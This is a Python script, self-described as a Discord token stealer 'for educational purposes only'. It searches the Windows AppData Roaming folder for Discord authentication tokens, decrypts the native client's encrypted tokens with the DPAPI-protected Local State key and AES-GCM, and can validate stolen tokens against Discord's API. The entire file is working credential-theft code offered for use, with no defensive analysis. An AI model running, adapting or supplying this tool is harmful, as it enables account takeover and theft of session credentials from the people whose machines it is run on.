"""
Steals discord tokens used for authenticating.
For educational purposes only!
"""
import argparse
import json
import os
import re

import requests
import win32crypt

from base64 import b64decode

from Crypto.Cipher import AES


def _is_latin(str):
    try:
        str.encode("latin-1")
        return True
    except UnicodeDecodeError:
        return False


def _get_decrypted_local_state_key(local_state_path):
    """
    Decrypts the key in local state
    :param local_state_path: Path of Local State file
    :return: Decrypted local state key
    """
    with open(local_state_path, 'r', encoding='utf-8') as local_state:
        local_state_data = json.load(local_state)
        encrypted_key = b64decode(local_state_data['os_crypt']['encrypted_key'])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]


def _discord_decrypt_token(encrypted_discord_token, local_state_key):
    """
    Decrypts a discord token
    :param encrypted_discord_token: Encrypted token
    :param local_state_key: Decrypted key from local state
    :return: Decrypted discord token
    """
    nonce = encrypted_discord_token[3:15]
    enrypted_key = encrypted_discord_token[15:-16]
    mac = encrypted_discord_token[-16:]
    decipher = AES.new(local_state_key, AES.MODE_GCM, nonce)
    try:
        decrypted_token = decipher.decrypt_and_verify(enrypted_key, mac)
        decrypted_token = decrypted_token.decode()
        return decrypted_token
    except:
        return None


def carve_discord_tokens(directory):
    """
    Carves for discord tokens in given directory
    :return: List of tuples - (file_path, token)
    """
    carved_tokens = []
    for root, dirs, filenames in os.walk(directory):
        for file in filenames:
            try:
                with open(os.path.join(root, file), "r", errors="ignore") as tmp_file:
                    data = tmp_file.read().replace('\n', '')

                    # Applies to native discord clients - the tokens are encrypted.
                    # We need the decrypted Local State Key for decrypting the discord token
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", data):
                        # Check if we can find the Local State file
                        local_state_path = root.replace("Local Storage\leveldb", "Local State")
                        if os.path.isfile(local_state_path):
                            carved_tokens.append((os.path.join(root, file),
                                                  _discord_decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]),
                                                                         _get_decrypted_local_state_key(
                                                                             local_state_path))))

                    # Applies to nearly every browser - the tokens are not encrypted
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", data):
                        carved_tokens.append(
                            (os.path.join(root, file), token))
            except:
                # May fail is file is locked
                pass
    return carved_tokens


def validate_discord_token(token):
    response = requests.get("https://discordapp.com/api/v9/users/@me", headers={"Authorization": token})
    if response.ok:
        return response.json()
    else:
        return None


if __name__ == '__main__':
    usage = 'discord_token_stealer.py [--directory <roaming-directory>] [--validate]\n'

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=usage)
    parser.add_argument('--directory', help='Directory from {DRIVE}\\Users\\{USER]\\AppData\\Roaming')
    parser.add_argument('--validate', help='If argument set, tokens get validated', action='store_true')
    args = parser.parse_args()

    print("[DTC - INFO] Carving tokens...")
    directory = os.getenv('APPDATA') if not args.directory else args.directory
    tokens = carve_discord_tokens(directory)
    if len(tokens) > 0:
        for discord_token in tokens:
            if args.validate:
                try:
                    result = validate_discord_token(discord_token[1])
                    print(f'[DTC - INFO] Source file: %s, token: %s, valid: %s, json: %s' % (
                        discord_token[0], discord_token[1], result is not None, result))
                except:
                    # May fail if encoding is not latin-1
                    pass
            else:
                try:
                    print(f'[DTC - INFO] Source file: %s, token: %s' % (discord_token[0], discord_token[1]))
                except:
                    # May fail if encoding is not latin-1
                    pass
    else:
        print("[DTC - WARNING] No tokens were found")
